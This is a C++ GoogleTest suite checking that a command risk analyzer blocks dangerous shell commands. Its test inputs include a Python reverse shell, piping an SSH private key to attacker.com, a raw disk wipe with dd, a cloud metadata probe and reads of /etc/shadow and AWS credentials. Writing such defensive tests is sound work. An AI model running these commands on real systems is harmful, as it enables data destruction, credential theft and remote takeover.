#include <gtest/gtest.h>
#include "commandforge/commands/risk_analyzer.hpp"
#include "commandforge/execution/execution_policy.hpp"

using namespace commandforge;

TEST(SecurityBoundariesTest, RejectsSudoAndPrivilegeEscalation) {
    RiskAnalyzer analyzer;
    ValidationResult res = analyzer.validate("sudo cat /etc/shadow");
    EXPECT_FALSE(res.is_allowed);
}

TEST(SecurityBoundariesTest, RejectsRawDiskWriting) {
    RiskAnalyzer analyzer;
    ValidationResult res = analyzer.validate("dd if=/dev/zero of=/dev/sda bs=1M");
    EXPECT_FALSE(res.is_allowed);
}

TEST(SecurityBoundariesTest, RejectsBase64PipeObfuscation) {
    RiskAnalyzer analyzer;
    ValidationResult res = analyzer.validate("echo bHMgLWxh | base64 -d | sh");
    EXPECT_FALSE(res.is_allowed);
}

TEST(SecurityBoundariesTest, RejectsCloudMetadataProbing) {
    RiskAnalyzer analyzer;
    ValidationResult res = analyzer.validate("curl -s http://169.254.169.254/latest/user-data");
    EXPECT_FALSE(res.is_allowed);
}

TEST(SecurityBoundariesTest, RejectsPythonReverseShells) {
    RiskAnalyzer analyzer;
    ValidationResult res = analyzer.validate("python3 -c 'import socket,pty; s=socket.socket(); s.connect((\"10.0.0.1\",4444)); pty.spawn(\"/bin/sh\")'");
    EXPECT_FALSE(res.is_allowed);
    EXPECT_FALSE(res.is_valid);
}

TEST(SecurityBoundariesTest, RejectsSshAndCloudCredentialsTheft) {
    RiskAnalyzer analyzer;
    ValidationResult res1 = analyzer.validate("cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com");
    EXPECT_FALSE(res1.is_allowed);

    ValidationResult res2 = analyzer.validate("cat ~/.aws/credentials");
    EXPECT_FALSE(res2.is_allowed);
}

TEST(SecurityBoundariesTest, RejectsCryptominingTools) {
    RiskAnalyzer analyzer;
    ValidationResult res = analyzer.validate("./xmrig --url stratum+tcp://pool.minexmr.com:4444");
    EXPECT_FALSE(res.is_allowed);
}
